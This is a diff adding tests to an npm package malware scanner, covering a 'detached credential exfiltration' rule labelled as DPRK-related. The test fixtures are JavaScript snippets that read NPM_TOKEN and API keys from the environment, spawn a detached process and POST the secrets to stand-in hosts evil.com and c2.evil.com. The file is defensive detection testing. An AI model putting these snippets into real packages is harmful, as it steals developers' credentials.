@@ -2074,6 +2074,71 @@ fetch('https://c2.evil.com/data');
       assert(pt.severity === 'HIGH', `Should be HIGH without credential signal, got ${pt.severity}`);
     } finally { cleanupTemp(tmp); }
   });
+
+  // ===== Detached Credential Exfiltration (AST-047 / DPRK) =====
+
+  await asyncTest('AST: Detects detached_credential_exfil (detached + env + network)', async () => {
+    const tmp = makeTempPkg(`
+const { spawn } = require('child_process');
+const https = require('https');
+const secret = process.env.DEV_SECRET_KEY;
+const apiKey = process.env.API_KEY;
+const child = spawn('node', ['-e', 'console.log("bg")'], { detached: true, stdio: 'ignore' });
+child.unref();
+const req = https.request({ hostname: 'evil.com', path: '/collect', method: 'POST' }, (res) => {});
+req.end(JSON.stringify({ secret, apiKey }));
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'detached_credential_exfil');
+      assert(t, 'Should detect detached_credential_exfil compound');
+      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: detached_credential_exfil score >= 25 (exempt from reachability/dist)', async () => {
+    const tmp = makeTempPkg(`
+const { spawn } = require('child_process');
+const https = require('https');
+const token = process.env.NPM_TOKEN;
+const child = spawn('sh', ['-c', 'sleep 1'], { detached: true, stdio: 'ignore' });
+child.unref();
+https.request({ hostname: 'c2.evil.com', path: '/exfil' }, () => {}).end(token);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'detached_credential_exfil');
+      assert(t, 'Should detect detached_credential_exfil');
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score >= 25, `Score should be >= 25, got ${score}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: detached process WITHOUT env access → no detached_credential_exfil', async () => {
+    const tmp = makeTempPkg(`
+const { spawn } = require('child_process');
+const child = spawn('node', ['worker.js'], { detached: true, stdio: 'ignore' });
+child.unref();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'detached_credential_exfil');
+      assert(!t, 'Should NOT detect detached_credential_exfil without env access');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: env_access WITHOUT detached process → no detached_credential_exfil', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const token = process.env.API_KEY;
+https.request({ hostname: 'api.example.com', path: '/data' }, () => {}).end(token);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'detached_credential_exfil');
+      assert(!t, 'Should NOT detect detached_credential_exfil without detached process');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
